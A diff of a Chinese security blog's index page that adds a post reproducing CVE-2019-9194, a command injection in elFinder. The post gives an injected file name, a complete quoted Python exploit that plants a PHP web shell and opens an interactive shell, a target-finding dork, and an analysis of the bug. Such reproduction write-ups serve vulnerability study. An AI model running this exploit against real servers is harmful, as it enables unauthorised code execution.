@@ -41,7 +41,7 @@
     <h2 class="author">Aluvion</h2>
     <h3 class="description">摸鱼</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>12</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>13</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>4</strong><br>标签</div></a>
     </div>
@@ -68,6 +68,86 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-划水CVE-2019-9194复现" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/22/划水CVE-2019-9194复现/" class="article-date">
+  <time class="post-time" datetime="2019-03-22T10:47:42.000Z" itemprop="datePublished">
+    <span class="post-month">3月</span><br>
+    <span class="post-day">22</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/22/划水CVE-2019-9194复现/">划水CVE-2019-9194复现</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- <div id="toc" class="toc-article">
+    <div class="toc-title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用过程"><span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a></li></ol>
+</div> -->
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>elFinder是一个Web文件管理平台，能够上传文件和对文件进行一些操作，其中在对图片进行旋转操作的时候，会拼接命令后执行，来调用Linux下的工具exiftran。而在这个过程中，作者一个失误导致了拼接命令的时候，没有使用在前几行进行过过滤的变量，而是使用了纯净未过滤的变量，这就导致了一个命令注入的漏洞。</p>
+<p>19、20、21这三天疯狂摸鱼，研究了一下PHP7.2通过写mem的方式绕过disabled functions，结果发现payload只有php-cli能用（也许php-cgi也可以？），php-fpm和mod_php都没有读取和写入mem的权限。然后又研究了一下Fastjson的绕过，结果踩进了Java的坑里，半天都爬不上来。</p>
+<p>今天看到这个漏洞，漏洞原理和复现都很简单，所以复现一下，继续第四天划水的学习生活……</p>
+<p>GitHub更新详情：<a href="https://github.com/Studio-42/elFinder/compare/2.1.47...2.1" target="_blank" rel="noopener">https://github.com/Studio-42/elFinder/compare/2.1.47...2.1</a></p>
+<hr>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>在GitHub上下载漏洞源码，漏洞版本为&lt;=2.1.47。</p>
+<p>然后使用docker搭建环境，环境为Ubuntu18+php7.2+apache2+exiftran，exiftran是一定要安装的，不然处理图片的时候会发生错误。</p>
+<p>然后把环境开起来即可。</p>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>上传一张图片，然后改名为test.png;ls &gt; pwn;echo test.png，最后右键图片-&gt;调整大小&amp;旋转-&gt;旋转-&gt;应用，即可在php目录下的pwn文件中看到ls命令执行的结果：</p>
+<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/elFinder/2019032201.png?raw=true" alt=""></p>
+<p>就是这么简单。</p>
+<p>或者使用别人写好的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># Exploit Title: elFinder &lt;= 2.1.47 - Command Injection vulnerability in the PHP connector.</span></span><br><span class="line"><span class="string"># Date: 26/02/2019</span></span><br><span class="line"><span class="string"># Exploit Author: @q3rv0</span></span><br><span class="line"><span class="string"># Vulnerability reported by: Thomas Chauchefoin</span></span><br><span class="line"><span class="string"># Google Dork: intitle:"elFinder 2.1.x"</span></span><br><span class="line"><span class="string"># Vendor Homepage: https://studio-42.github.io/elFinder/</span></span><br><span class="line"><span class="string"># Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz</span></span><br><span class="line"><span class="string"># Version: &lt;= 2.1.47</span></span><br><span class="line"><span class="string"># Tested on: Linux 64bit + Python2.7</span></span><br><span class="line"><span class="string"># PoC: https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/</span></span><br><span class="line"><span class="string"># CVE: CVE-2019-9194</span></span><br><span class="line"><span class="string"># Usage: python exploit.py [URL]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p &gt; SecSignal.php;echo SecSignal.jpg'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Usage: python exploit.py [URL]"</span></span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span><span class="params">(url, payload)</span>:</span></span><br><span class="line">    files = &#123;<span class="string">'upload[]'</span>: (payload, open(<span class="string">'SecSignal.jpg'</span>, <span class="string">'rb'</span>))&#125;</span><br><span class="line">    data = &#123;<span class="string">"reqid"</span> : <span class="string">"1693222c439f4"</span>, <span class="string">"cmd"</span> : <span class="string">"upload"</span>, <span class="string">"target"</span> : <span class="string">"l1_Lw"</span>, <span class="string">"mtime[]"</span> : <span class="string">"1497726174"</span>&#125;</span><br><span class="line">    r = requests.post(<span class="string">"%s/php/connector.minimal.php"</span> % url, files=files, data=data)</span><br><span class="line">    j = json.loads(r.text)</span><br><span class="line">    <span class="keyword">return</span> j[<span class="string">'added'</span>][<span class="number">0</span>][<span class="string">'hash'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">imgRotate</span><span class="params">(url, hash)</span>:</span></span><br><span class="line">    r = requests.get(<span class="string">"%s/php/connector.minimal.php?target=%s&amp;width=539&amp;height=960&amp;degree=180&amp;quality=100&amp;bg=&amp;mode=rotate&amp;cmd=resize&amp;reqid=169323550af10c"</span> % (url, hash))</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(url)</span>:</span></span><br><span class="line">    r = requests.get(<span class="string">"%s/php/SecSignal.php"</span> % url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">       <span class="keyword">print</span> <span class="string">"[+] Pwned! :)"</span></span><br><span class="line">       <span class="keyword">print</span> <span class="string">"[+] Getting the shell..."</span></span><br><span class="line">       <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">           <span class="keyword">try</span>:</span><br><span class="line">               input = raw_input(<span class="string">"$ "</span>)</span><br><span class="line">               r = requests.get(<span class="string">"%s/php/SecSignal.php?c=%s"</span> % (url, input))</span><br><span class="line">               <span class="keyword">print</span> r.text</span><br><span class="line">           <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">               sys.exit(<span class="string">"\nBye kaker!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] The site seems not to be vulnerable :("</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    usage()</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Uploading the malicious image..."</span></span><br><span class="line">    hash = upload(url, payload)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Running the payload..."</span></span><br><span class="line">    imgRotate(url, hash)</span><br><span class="line">    shell(url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先通过查看GitHub更新来寻找漏洞点，因为2.1.48中的更新没有漏洞修复的内容，所以我们查看2.1.47的更新内容，可以看到在一堆给命令加了–的更新之中，有一个比较特别的更新：</p>
+<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/elFinder/2019032202.png?raw=true" alt=""></p>
+<p>这里修改了命令拼接的参数，然后执行命令的函数procExec就在下方，看来漏洞触发点就在这里了。</p>
+<p>观察函数名，可以猜测这里是对图片进行旋转修改的时候的处理函数，那我们给这里下断点，然后尝试对图片进行旋转修改：</p>
+<p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/elFinder/2019032203.png?raw=true" alt=""></p>
+<p>看得很清楚，本来代码用escapeshellarg对path变量进行了过滤，然后将过滤结果存放在quotedPath变量中，但是后面拼接的时候却还是使用了纯净的path变量，也就是我们的图片文件存放的路径，最后形成一个类似于这样的Linux命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftran -i -9 $path</span><br></pre></td></tr></table></figure>
+<p>所以我们就可以修改文件名，使用命令分隔符来执行我们的恶意命令。</p>
+<p>还有要注意的是，elFinder对文件后缀名有要求，所以需要用一个echo test.png来闭合一下；以及elFinder会对文件名进行过滤，如果有一些字符就会阻止重命名，例如：/；</p>
+<hr>
+<p>参考文章：</p>
+<p><a href="https://packetstormsecurity.com/files/151960/elFinder-2.1.47-Command-Injection.html" target="_blank" rel="noopener">https://packetstormsecurity.com/files/151960/elFinder-2.1.47-Command-Injection.html</a></p>
+<p><a href="https://xz.aliyun.com/t/4444" target="_blank" rel="noopener">https://xz.aliyun.com/t/4444</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/03/22/划水CVE-2019-9194复现/" data-id="cjtk9sya7000l68v6qf0tv6jb" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/复现/">复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-Java反序列化漏洞-Fastjson" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
@@ -116,7 +196,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/17/Java反序列化漏洞-Fastjson/" data-id="cjtimo1170000b0v64ityfasx" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/17/Java反序列化漏洞-Fastjson/" data-id="cjtk9sy9z000c68v64qs0326p" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -175,7 +255,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/16/wordpress5-1-CSRF-to-XSS-to-RCE复现/" data-id="cjtimo177000vb0v6o3cd0pou" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/16/wordpress5-1-CSRF-to-XSS-to-RCE复现/" data-id="cjtk9syad000s68v69jfbg86i" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/复现/">复现</a></li></ul>
@@ -236,7 +316,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/14/DNS-Rebinding/" data-id="cjtimo12c0003b0v6lo2ex5p8" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/14/DNS-Rebinding/" data-id="cjtk9sy9u000568v6hngztudr" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -295,7 +375,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/14/在连接MySQL服务端时读取客户端文件/" data-id="cjtimo178000wb0v6vhieh3w5" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/14/在连接MySQL服务端时读取客户端文件/" data-id="cjtk9syaf000u68v6p0mophvq" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
@@ -357,7 +437,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/10/Wordpress5-0-RCE-CVE-2019-8942复现/" data-id="cjtimo12h0006b0v6eq7dmbt1" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/10/Wordpress5-0-RCE-CVE-2019-8942复现/" data-id="cjtk9sya1000h68v6f11rv44p" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/复现/">复现</a></li></ul>
@@ -413,7 +493,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/09/cve-2019-5736-复现失败/" data-id="cjtimo12n000db0v6j6p9z6az" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/09/cve-2019-5736-复现失败/" data-id="cjtk9sya0000f68v6qa8zyruf" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/二进制/">二进制</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/复现/">复现</a></li></ul>
@@ -427,9 +507,9 @@
 
 
   
-    <article id="post-Nexus-Repository-Manager-3-CVE-2019-7238-IDEA远程调试" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+    <article id="post-Nexus-Repository-Manager-3-CVE-2019-7238-IDEA远程调试" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2019/03/04/Nexus-Repository-Manager-3-CVE-2019-7238-IDEA远程调试/" class="article-date">
+    <a href="/2019/03/04/Nexus-Repository-Manager-3-CVE-2019-7238-IDEA远程调试/" class="article-date">
   <time class="post-time" datetime="2019-03-04T11:31:13.000Z" itemprop="datePublished">
     <span class="post-month">3月</span><br>
     <span class="post-day">04</span>
@@ -444,7 +524,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/04/Nexus-Repository-Manager-3-CVE-2019-7238-IDEA远程调试/">Nexus Repository Manager 3 CVE-2019-7238 IDEA远程调试</a>
+      <a class="article-title" href="/2019/03/04/Nexus-Repository-Manager-3-CVE-2019-7238-IDEA远程调试/">Nexus Repository Manager 3 CVE-2019-7238 IDEA远程调试</a>
     </h1>
   
 
@@ -464,13 +544,13 @@
 <p>两周之前出现的一个漏洞（结果我拖了两周才复现），有很多师傅已经写了复现文章，我研读了师傅们的文章，然后自己动手操作了两三天，虽然不是第一次接触 Java 的漏洞，不过这是我第一次使用IDEA来进行远程调试，所以写一篇文章记录一下。</p>
         
           <p class="article-more-link">
-            <a href="/2019/03/04/Nexus-Repository-Manager-3-CVE-2019-7238-IDEA远程调试/#more">Read More</a>
+            <a href="/2019/03/04/Nexus-Repository-Manager-3-CVE-2019-7238-IDEA远程调试/#more">Read More</a>
           </p>
         
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/04/Nexus-Repository-Manager-3-CVE-2019-7238-IDEA远程调试/" data-id="cjtimo16k000nb0v64zz6iurj" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/04/Nexus-Repository-Manager-3-CVE-2019-7238-IDEA远程调试/" data-id="cjtk9sy9w000768v6mfh3ds0y" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/复现/">复现</a></li></ul>
@@ -527,7 +607,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/01/Winrar远程代码执行漏洞复现/" data-id="cjtimo16h000lb0v63862dlfv" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/01/Winrar远程代码执行漏洞复现/" data-id="cjtk9sy9y000a68v6zj1blbzm" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/二进制/">二进制</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/复现/">复现</a></li></ul>
@@ -585,70 +665,10 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/27/GoogleCTF2018-beginners-js_safe_1/" data-id="cjtimo12f0004b0v6mpu41gqh" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/02/27/GoogleCTF2018-beginners-js_safe_1/" data-id="cjtk9sya9000n68v627f0tuxl" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-CVE-2019-1003000复现" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/02/26/CVE-2019-1003000复现/" class="article-date">
-  <time class="post-time" datetime="2019-02-26T10:56:00.000Z" itemprop="datePublished">
-    <span class="post-month">2月</span><br>
-    <span class="post-day">26</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/26/CVE-2019-1003000复现/">CVE-2019-1003000复现</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p><a href="https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/" target="_blank" rel="noopener">https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/</a></p>
-<p><a href="https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/" target="_blank" rel="noopener">https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/</a></p>
-<hr>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>因为docker部署的 Jenkins 会自行安装插件，这里可能会有一些插件版本上面的问题，所以我们的漏洞环境采用GitHub项目+docker进行搭建，GitHub地址：<a href="https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git。" target="_blank" rel="noopener">https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git。</a></p>
-<p>下载到的项目有EXP和环境源码，我们主要用的是sample-vuln目录下的代码，这里可以直接运行他的run.sh进行docker的搭建，docker会自行下载需要的images。（PS：我的虚拟机下载images有点慢，所以我用VPS下载然后再导出导入）</p>
-<p>这个环境跟Orange大佬的环境稍有不同，Orange大佬的环境采用的是Read-only Mode的权限模式，而这个环境用的是Authenticated Mode，同时还给了一个user1/user1的用户，就我们复现漏洞而言并没有什么关系。</p>
-        
-          <p class="article-more-link">
-            <a href="/2019/02/26/CVE-2019-1003000复现/#more">Read More</a>
-          </p>
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/02/26/CVE-2019-1003000复现/" data-id="cjtimo16f000kb0v6q167gsv1" class="article-share-link">分享</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/复现/">复现</a></li></ul>
 
     </footer>
   </div>
@@ -703,7 +723,7 @@
     <h2 class="author">Aluvion</h2>
     <h3 class="description">摸鱼</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>12</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>13</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>4</strong><br>标签</div></a>
     </div>
